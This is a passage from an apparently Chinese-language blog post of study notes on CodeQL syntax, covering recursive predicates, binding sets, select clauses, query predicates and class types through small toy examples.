addOne(v)</span><br></pre></td></tr></table></figure><h4 id="递归谓词">递归谓词</h4><p>这里说的递归并非我们常规理解的函数递归，我们可以理解为一个<strong>可反向查找的谓词</strong>，或者换一个思维，把非递归的结果谓词理解为一个有向图，那么<strong>递归的结果谓词可以理解为一个无向图</strong>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">string getANeighbor(string country) &#123;</span><br><span class="line">    country <span class="operator">=</span> &quot;France&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Belgium&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country <span class="operator">=</span> &quot;France&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Germany&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country <span class="operator">=</span> &quot;Germany&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Austria&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country <span class="operator">=</span> &quot;Germany&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Belgium&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country <span class="operator">=</span> getANeighbor(<span class="keyword">result</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> string people</span><br><span class="line"><span class="keyword">where</span> people <span class="operator">=</span> getANeighbor(&quot;Germany&quot;)</span><br><span class="line"><span class="keyword">select</span> people</span><br></pre></td></tr></table></figure><p>输出结果如下：</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250317094330880.png" alt="image-20250317094330880"></p><p>输出的结果为：<code>France</code>、<code>Austria</code>、<code>Belgium</code>。</p><p>为什么会有<code>France</code>呢？</p><p>因为<code>getANeighbor(&quot;Germany&quot;)</code>，由</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">country <span class="operator">=</span> &quot;Germany&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Austria&quot;</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">country <span class="operator">=</span> &quot;Germany&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Belgium&quot;</span><br></pre></td></tr></table></figure><p>可以得到<code>Austria、Belgium</code>。</p><p>这里的递归不是<strong>单向</strong>的，而是<strong>双向</strong>的，由于存在<code>France -&gt; Germany</code>，所以由<code>Germany</code>可以反向递归得到<code>France</code>这个结果。</p><h4 id="特征谓词、非成员谓词、成员谓词">特征谓词、非成员谓词、成员谓词</h4><p>谓词分为三种，即<strong>非成员谓词</strong>、<strong>成员谓词语</strong>和<strong>特征谓词</strong>。</p><ul><li><p>非成员谓词是在<strong>类之外定义</strong>的，它们不是任何类的成员。</p></li><li><p>成员谓词则是在类里面定义的。</p></li><li><p>特征谓词则是类中的特殊谓词。</p></li></ul><p>类似于其他语言中类的构造函数。</p><p>每种谓词的示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> getSuccessor(<span class="type">int</span> i) &#123;  <span class="operator">/</span><span class="operator">/</span> <span class="number">1.</span> 非成员谓词(Non<span class="operator">-</span><span class="keyword">member</span> predicate)</span><br><span class="line">  <span class="keyword">result</span> <span class="operator">=</span> i <span class="operator">+</span> <span class="number">1</span> <span class="keyword">and</span></span><br><span class="line">  i <span class="keyword">in</span> [<span class="number">1</span> .. <span class="number">9</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class FavoriteNumbers extends <span class="type">int</span> &#123;</span><br><span class="line">  FavoriteNumbers() &#123;  <span class="operator">/</span><span class="operator">/</span> <span class="number">2.</span> 特征谓词(Characteristic predicate)</span><br><span class="line">    this <span class="operator">=</span> <span class="number">1</span> <span class="keyword">or</span></span><br><span class="line">    this <span class="operator">=</span> <span class="number">4</span> <span class="keyword">or</span></span><br><span class="line">    this <span class="operator">=</span> <span class="number">9</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  string getName() &#123;   <span class="operator">/</span><span class="operator">/</span> <span class="number">3.</span> 成员谓词(<span class="keyword">Member</span> predicate) <span class="keyword">for</span> the class `FavoriteNumbers`</span><br><span class="line">    this <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;one&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    this <span class="operator">=</span> <span class="number">4</span> <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;four&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    this <span class="operator">=</span> <span class="number">9</span> <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;nine&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="绑定行为与绑定集">绑定行为与绑定集</h4><p>谓词只能包含有限数量的元组。</p><p>正例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> 正例，i被限定在<span class="number">1</span>到<span class="number">10</span>内，或者你也可以给i赋一个确定的值如i<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="type">int</span> addOne(<span class="type">int</span> i) &#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> i <span class="operator">+</span> <span class="number">1</span> <span class="keyword">and</span></span><br><span class="line">    i <span class="keyword">in</span> [<span class="number">1</span> .. <span class="number">10</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> 反例，i是无限数量值的，此时CodeQL编译器会报错: The body <span class="keyword">of</span> this <span class="string">&#x27;test::addOne&#x27;</span> does <span class="keyword">not</span> bind <span class="string">&#x27;result&#x27;</span> <span class="keyword">to</span> a value.</span><br><span class="line"><span class="type">int</span> addOne(<span class="type">int</span> i) &#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> i <span class="operator">+</span> <span class="number">1</span> <span class="keyword">and</span></span><br><span class="line">    i <span class="operator">&gt;</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250317104709821.png" alt="image-20250317104709821"></p><h5 id="单个绑定集">单个绑定集</h5><p>为了使上述的反例谓词能够通过编译，我们可以使用绑定集(bindingset)，但是当我们去调用这个谓词时，传递的参数还是<strong>只能在有限的参数集中</strong>。<br>上面的反例可以修改为如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bindingset[i]</span><br><span class="line"><span class="type">int</span> addOne(<span class="type">int</span> i) &#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> i <span class="operator">+</span> <span class="number">1</span> <span class="keyword">and</span></span><br><span class="line">    i <span class="operator">&gt;</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 此时我们可以去调用这个谓词，但是需要注意传递过来的参数还是只能在有限的参数集中</span><br><span class="line"><span class="keyword">from</span> <span class="type">int</span> i</span><br><span class="line"><span class="keyword">where</span> i <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> addOne(i)</span><br></pre></td></tr></table></figure><h5 id="多个绑定集">多个绑定集</h5><p>我们同样可以添加多个绑定集，下面是一个例子:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bindingset[x] bindingset[y]</span><br><span class="line">predicate plusOne(<span class="type">int</span> x, <span class="type">int</span> y) &#123;</span><br><span class="line">  x <span class="operator">+</span> <span class="number">1</span> <span class="operator">=</span> y</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">from</span> <span class="type">int</span> z</span><br><span class="line"><span class="keyword">where</span> z<span class="operator">=</span> <span class="number">2</span> <span class="keyword">and</span> plusOne(<span class="number">1</span>, z)</span><br><span class="line"><span class="keyword">select</span> z</span><br></pre></td></tr></table></figure><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250317113123536.png" alt="image-20250317113123536"></p><p>这个绑定集的意思是如果x或y绑定(bound)了，那么x和y都绑定，即至少有一个参数受到约束。<br>如果我们想要两者都受约束，可以将例子修改一下:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bindingset[x, y]</span><br><span class="line">predicate plusOne(<span class="type">int</span> x, <span class="type">int</span> y) &#123;</span><br><span class="line">  x <span class="operator">+</span> <span class="number">1</span> <span class="operator">=</span> y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么这个谓词就变为了一个类似于校验的函数，即<code>x+1 == y</code>。</p><h3 id="查询Queries">查询Queries</h3><p>官方文档<sup class="footnote-ref"><a href="#fn8" id="fnref8">[8]</a></sup>，查询是<code>CodeQL</code>的输出。查询的两种类型，分别是</p><ul><li><code>select</code>子句</li><li>查询谓语，意味着我们可以从当前模块中定义或者从其他模块中导入。</li></ul><h4 id="select子句">select子句</h4><p>子句的格式如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="comment">/* ... variable declarations ... */</span></span><br><span class="line"><span class="keyword">where</span> <span class="comment">/* ... logical formula ... */</span></span><br><span class="line"><span class="keyword">select</span> <span class="comment">/* ... expressions ... */</span></span><br></pre></td></tr></table></figure><p><code>from</code>和<code>where</code>部分是可选的。我们可以在<code>from</code>中定义变量，在<code>where</code>中给变量赋值和对查询结果的过滤，最后在<code>select</code>中显示结果。</p><p>在<code>select</code>后面除了表达式(<code>expressions</code>)之外，还可以使用一些关键字：</p><ul><li><code>as</code>关键字，后面跟随一个名字。作用相当于sql中的<code>as</code>，为结果列提供了一个&quot;标签&quot;，并允许在后续的<code>select</code>表达式中使用它们。</li><li><code>order by</code>关键字，后面跟随一个结果列名。作用相当于sql中的<code>order by</code>，用于排序结果，并且在结果列名后可选<code>asc</code>(升序)或<code>desc</code>(降序)关键字。</li></ul><p><code>as</code>关键字，例子如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="type">int</span> x, <span class="type">int</span> y</span><br><span class="line"><span class="keyword">where</span> x <span class="operator">=</span> <span class="number">3</span> <span class="keyword">and</span> y <span class="keyword">in</span> [<span class="number">0</span> .. <span class="number">2</span>]</span><br><span class="line"><span class="keyword">select</span> x, y, x <span class="operator">*</span> y <span class="keyword">as</span> product, &quot;product: &quot; <span class="operator">+</span> product</span><br></pre></td></tr></table></figure><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250428223626775.png" alt="image-20250428223626775"></p><p><code>order by</code>关键字，如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="type">int</span> x, <span class="type">int</span> y</span><br><span class="line"><span class="keyword">where</span> x <span class="operator">=</span> <span class="number">3</span> <span class="keyword">and</span> y <span class="keyword">in</span> [<span class="number">0</span> .. <span class="number">2</span>]</span><br><span class="line"><span class="keyword">select</span> x, y, x <span class="operator">*</span> y <span class="keyword">as</span> product, &quot;product: &quot; <span class="operator">+</span> product <span class="keyword">order</span> <span class="keyword">by</span> y <span class="keyword">desc</span></span><br></pre></td></tr></table></figure><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250428224020685.png" alt="image-20250428224020685"></p><h4 id="查询谓词">查询谓词</h4><p>查询谓词是一个<strong>非成员谓词</strong>，并在最开头使用<code>query</code>作为注解。它返回谓词计算结果的所有元组，下面是一个简单的示例:</p><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">query <span class="type">int</span> getProduct(<span class="type">int</span> x, <span class="type">int</span> y) &#123;</span><br><span class="line">  x <span class="operator">=</span> <span class="number">3</span> <span class="keyword">and</span></span><br><span class="line">  y <span class="keyword">in</span> [<span class="number">0</span> .. <span class="number">2</span>] <span class="keyword">and</span></span><br><span class="line">  <span class="keyword">result</span> <span class="operator">=</span> x <span class="operator">*</span> y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250428233723056.png" alt="image-20250428233723056"></p><p>编写查询谓词而不是<code>select</code>子句的一个好处是，你也可以在代码的其它部分调用谓词。<code>select</code>子句就像一个匿名谓词，你以后无法调用它。</p><p>例如， 我们可以在类中的特征谓词内部调用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">query <span class="type">int</span> getProduct(<span class="type">int</span> x, <span class="type">int</span> y) &#123;</span><br><span class="line">    x <span class="operator">=</span> <span class="number">3</span> <span class="keyword">and</span></span><br><span class="line">    y <span class="keyword">in</span> [<span class="number">0</span> .. <span class="number">2</span>] <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> x <span class="operator">*</span> y</span><br><span class="line">&#125;</span><br><span class="line">class MultipleOfThree extends <span class="type">int</span> &#123;</span><br><span class="line">    MultipleOfThree() &#123; </span><br><span class="line">        this <span class="operator">=</span> getProduct(_, _) </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">from</span> MultipleOfThree m <span class="keyword">select</span> m</span><br></pre></td></tr></table></figure><p>这样我们查询结果就有2个，一个是内置的<code>#select</code>，一个是<code>getProduct</code>，<code>#select</code>的结果如下:</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250428234414817.png" alt="image-20250428234414817"></p><h3 id="类型Types">类型Types</h3><p><code>QL</code>是一种静态类型语言，因此每个变量都必须具有声明类型。</p><p>类型是一组值。例如，类型<code>int</code>是整数的集合。注意⚠️，一个值可以属于多个集合，这意味着它可以有多种类型。</p><p><code>QL</code>中的类型有原始类型(<code>primitive types</code>)、类(<code>classes</code>)、字符类型(<code>character types</code>)、类域类型(<code>class domain types</code>)、代数数据类型(<code>algebraic datatypes</code>)、类型联合(<code>type unions</code>)和数据库类型(<code>database types</code>)。</p><h4 id="原始类型-Primitive-types">原始类型(Primitive types)</h4><p>这些类型内置于 QL 中，并且始终在全局<a href="https://codeql.github.com/docs/ql-language-reference/name-resolution/#namespaces">命名空间</a>中可用，独立于您正在查询的数据库。</p><ol><li><strong>boolean</strong> : 此类型包含值<code>true</code>和<code>false</code>。</li><li><strong>float</strong> : 此类型包含64位浮点数，例如<code>6.28</code>和<code>-0.618</code></li><li><strong>int</strong> : 此类型包含 32 位<a href="https://en.wikipedia.org/wiki/Two's_complement">二进制补码</a>整数，例如<code>-1</code>和<code>42</code> 。</li><li><strong>string</strong> : 此类型包含 16 位字符的有限字符串。</li><li><strong>data</strong> : 此类型包含日期（也可以包含时间）。</li></ol><p>QL 在基本类型上定义了一系列内置操作。这些操作可以通过使用<code> .</code>的方式进行调用。例如， <code>1.toString()</code>是整数常量<code>1</code>的字符串表示。有关 QL 中可用的内置操作的完整列表，请参阅 QL 语言规范中的<a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#built-ins">内置操作</a>部分。</p><p>此外， <a href="https://codeql.github.com/docs/ql-language-reference/modules/#bigint">QlBuiltins::BigInt</a>有一个任意范围的整数原始类型</p><h4 id="类-Classes">类(Classes)</h4><p>你可以在<code>QL</code>中定义自己的类型。一种方法是定义一个<strong>类</strong>。</p><p>类提供了一种简单的方法来重写和构造代码。例如，你可以：</p><ul><li>将相关值组合在一起。</li><li>根据这些值定义<a href="https://codeql.github.com/docs/ql-language-reference/types/#member-predicates">成员谓词</a>。</li><li>定义子类以重写成员谓词。</li></ul><p>QL 中的类不会“创建”新对象，它仅表示逻辑属性。如果某个值满足该逻辑属性，则该值属于特定类。</p><h5 id="定义一个类型-Defining-a-class">定义一个类型(Defining a class)</h5><p>要定义一个类，你可以这样写：</p><ol><li>关键字<code>class</code></li><li>类的名称。这是一个<a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#identifiers">标识符</a> 以大写字母开头。</li><li>改类通过<code>extends</code>和<code>/</code>或<code>instanceof</code>关联父类型(<code>supertypes</code>)。</li><li>类的主体，用括号括起来。</li></ol><p>定义类的格式，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ClassName</span> [<span class="keyword">extends</span> <span class="title class_">Parent</span>] &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类名首字母必须是大写⚠️，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OneTwoThree</span> <span class="keyword">extends</span> <span class="title class_">int</span> &#123;</span><br><span class="line">  OneTwoThree() &#123; <span class="comment">// characteristic predicate</span></span><br><span class="line">    <span class="built_in">this</span> = <span class="number">1</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">2</span> <span class="type">or</span> <span class="variable">this</span> <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  string <span class="title function_">getAString</span><span class="params">()</span> &#123; <span class="comment">// member predicate</span></span><br><span class="line">    result = <span class="string">&quot;One, two or three: &quot;</span> + <span class="built_in">this</span>.toString()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isEven</span><span class="params">()</span> &#123; <span class="comment">// member predicate</span></span><br><span class="line">    <span class="built_in">this</span> = <span class="number">2</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这定义了一个类<code>OneTwoThree</code>，它包含值<code>1</code>,<code>2</code>和<code>3</code>。 <a href="https://codeql.github.com/docs/ql-language-reference/types/#characteristic-predicates">特征谓词</a>捕捉 “是整数 1、2 或 3 之一” 的逻辑属性。</p><p><code>OneTwoThree</code>扩展了<code>int</code>，也就是说，它是<code>int</code>的子类型。<code>QL</code>中的类必须始终具有至少一个父类型(<code>supertypes</code>)。使用<code>extends</code>关键字引用的父类型称为类的基类型(<code>base types</code>)。类的值包含在父类型的交集中（即，它们位于<a href="https://codeql.github.com/docs/ql-language-reference/types/#domain-types">类的域类型</a>中）。类从其基类型继承所有成员谓词。</p><p>一个类可以扩展多种类型。更多信息，请参阅&quot;<a href="https://codeql.github.com/docs/ql-language-reference/types/#multiple-inheritance"> 多重继承 </a>&quot;。一个类可以扩展<code>final</code>类型（或<code>final</code>类型的别名），请参阅&quot;<a href="https://codeql.github.com/docs/ql-language-reference/types/#final-extensions">final 扩展 </a>“。类还可以特化其他类型，而无需通过<code>instanceof</code>扩展类接口，请参阅”<a href="https://codeql.github.com/docs/ql-language-reference/types/#instanceof-extensions"> 不扩展子类型 </a>&quot;。</p><p>在<code>CodeQL</code>中，类允许多重继承，但是以下操作是非法的:</p><ul><li>不能继承本身</li><li>不能继承<code>final</code>类</li><li>不能继承不兼容的类型，请参考&quot;<a href="https://codeql.github.com/docs/ql-language-reference/types/#type-compatibility"> 类型兼容性 </a>&quot;。</li></ul><p>你也可以为类添加注解。可以查看类的<a href="https://codeql.github.com/docs/ql-language-reference/annotations/#annotations-overview">注解</a>列表。</p><h5 id="类主体-Class-bodies">类主体(Class bodies)</h5><p>类的主体可以包含：</p><ul><li><a href="https://codeql.github.com/docs/ql-language-reference/types/#characteristic-predicates">特征谓词</a>(<code>characteristic predicate</code>)声明。</li><li><a href="https://codeql.github.com/docs/ql-language-reference/types/#characteristic-predicates">特征谓词</a>(<code>member predicate</code>)声明。</li><li>任意数量的<a href="https://codeql.github.com/docs/ql-language-reference/types/#fields">字段</a>(<code>field</code>)声明。</li></ul><p>当你定义一个类时，该类还会从其父类型继承所有非私有成员谓词和字段。</p><p>根据它们是否是<code>final</code>的，你可以<a href="https://codeql.github.com/docs/ql-language-reference/types/#overriding-member-predicates">重写</a>(<code>override</code>)或 <a href="https://codeql.github.com/docs/ql-language-reference/types/#final-extensions">隐藏</a>(<code>shadow</code>)这些谓词和字段以赋予它们更具体的定义。</p><h5 id="特征谓词-Characteristic-predicate">特征谓词(Characteristic predicate)</h5><p>类似于其他语言中类的构造函数，只能定义一个，我们可以在特征谓词中使用<code>this</code>来限制类中可能的值。在上述例子中，<code>OneTwoThree</code>被限制为<code>1-3</code>中的整数。</p><h5 id="成员谓词-Member-predicate">成员谓词(Member predicate)</h5><p>这些谓词仅适用于类中。我们可以这样去调用类的成员谓词：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class OneTwoThree extends <span class="type">int</span> &#123;</span><br><span class="line">    OneTwoThree() &#123; <span class="operator">/</span><span class="operator">/</span> characteristic predicate</span><br><span class="line">      this <span class="operator">=</span> <span class="number">1</span> <span class="keyword">or</span> this <span class="operator">=</span> <span class="number">2</span> <span class="keyword">or</span> this <span class="operator">=</span> <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    string getAString() &#123; <span class="operator">/</span><span class="operator">/</span> <span class="keyword">member</span> predicate</span><br><span class="line">      <span class="keyword">result</span> <span class="operator">=</span> &quot;One, two or three: &quot; <span class="operator">+</span> this.toString()</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    predicate isEven() &#123; <span class="operator">/</span><span class="operator">/</span> <span class="keyword">member</span> predicate</span><br><span class="line">      this <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="number">1.</span>(OneTwoThree).getAString()</span><br></pre></td></tr></table></figure><p>结果为：</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250429143457327.png" alt="image-20250429143457327"></p><p>表达式（<code>OneTwoThree</code>)是一个<a href="https://codeql.github.com/docs/ql-language-reference/expressions/#casts">强制类型转换 </a>。它确保<code>1</code>具有类型<code>OneTwoThree</code>而不仅仅是<code>int</code>。因此，它可以访问成员谓词<code>getAString()</code>。</p><p>还可以这样调用，例如，你可以使用<code>string</code>定义的内置函数<code>toUpperCase()</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1.</span>(OneTwoThree).getAString().toUpperCase()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250429152458427.png" alt="image-20250429152458427"></p><h5 id="字段-Field">字段(Field)</h5><p>这些是在类主体中声明的变量。类主体中可以有任意数量的字段声明。你可以在类内部的谓词声明中使用这些变量。与<a href="https://codeql.github.com/docs/ql-language-reference/types/#this">变量 </a><code>this</code> 类似，字段必须在<a href="https://codeql.github.com/docs/ql-language-reference/types/#characteristic-predicates">特征谓词</a> 中受到约束。</p><p>一个简单的例子如下，它输出<code>10</code>以内每个数字的除数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class <span class="type">SmallInt</span> extends <span class="type">int</span> &#123;</span><br><span class="line">    <span class="type">SmallInt</span>() &#123; this <span class="operator">=</span> [<span class="number">1</span> .. <span class="number">10</span>] &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  class DivisibleInt extends <span class="type">SmallInt</span> &#123;</span><br><span class="line">    <span class="type">SmallInt</span> divisor;   <span class="operator">/</span><span class="operator">/</span> declaration <span class="keyword">of</span> the field `divisor`</span><br><span class="line">    DivisibleInt() &#123; this <span class="operator">%</span> divisor <span class="operator">=</span> <span class="number">0</span> &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="type">SmallInt</span> getADivisor() &#123; <span class="keyword">result</span> <span class="operator">=</span> divisor &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">from</span> DivisibleInt i</span><br><span class="line">  <span class="keyword">select</span> i, i.getADivisor()</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>输出的结果如下：</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250430115409761.png" alt="image-20250430115409761"></p><h5 id="具体类-Concrete-classes">具体类(Concrete classes)</h5><p>上述所提到的类都是具体的类，具体类是通过限制较大类型中的值来定义的。</p><h5 id="抽象类-Abstract-classes">抽象类(Abstract classes)</h5><p>带有 <code>abstract</code><a href="https://codeql.github.com/docs/ql-language-reference/annotations/#abstract"> 注释的</a>类称为<strong>抽象</strong>类。具体而言，对于抽象类中的值，它必须<strong>满足类本身的特征谓词和子类的特征谓词</strong>。请注意，在这种情况下， final 扩展不被视为子类。</p><p>如果您想将多个现有类归类到一个通用名称下，抽象类就非常有用。然后，您可以在所有这些类上定义成员谓词。你还可以扩展预定义的抽象类：例如，如果你导入一个包含抽象类的库，则可以为其添加更多子类。</p><p>例子：</p><p>希望识别所有可解释为 SQL 查询的表达式。您可以使用以下抽象类来描述这些表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">SqlExpr</span> <span class="keyword">extends</span> <span class="title class_">Expr</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在定义各种子类——每种数据库管理系统对应一个。例如，您可以定义一个子类 <code>class 